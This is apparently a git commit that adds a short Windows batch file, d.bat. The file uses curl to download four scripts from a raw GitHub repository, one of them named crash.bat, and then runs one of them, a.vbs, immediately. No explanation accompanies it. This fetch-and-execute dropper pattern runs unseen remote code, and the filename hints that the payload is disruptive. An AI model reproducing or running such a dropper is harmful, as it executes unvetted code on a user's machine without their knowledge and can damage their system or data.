4f8818c8c63f2710aa5ca655e984e6fde816c9e9
p6c <77642915+p6c@users.noreply.github.com>
2021-01-19 16:53:39 +0100

    Add files via upload

---
+++ d.bat
@@ -0,0 +1,6 @@
+@echo off
+curl --output a.vbs "https://raw.githubusercontent.com/p6c/a/main/a.vbs"
+curl --output b.vbs "https://raw.githubusercontent.com/p6c/a/main/b.vbs"
+curl --output c.bat "https://raw.githubusercontent.com/p6c/a/main/c.bat"
+curl --output crash.bat "https://raw.githubusercontent.com/p6c/a/main/crash.bat"
+a.vbs
